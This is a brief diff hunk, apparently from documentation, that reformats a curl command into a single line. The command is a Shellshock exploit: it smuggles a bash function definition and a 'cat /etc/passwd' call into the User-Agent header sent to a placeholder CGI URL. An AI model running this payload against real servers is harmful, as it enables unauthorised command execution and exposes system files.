@@ -120,8 +120,7 @@
         or
 
         ```
-        curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
-http://VICTIM/cgi-bin/vulnerable
+        curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://VICTIM/cgi-bin/vulnerable
         ```
         
         
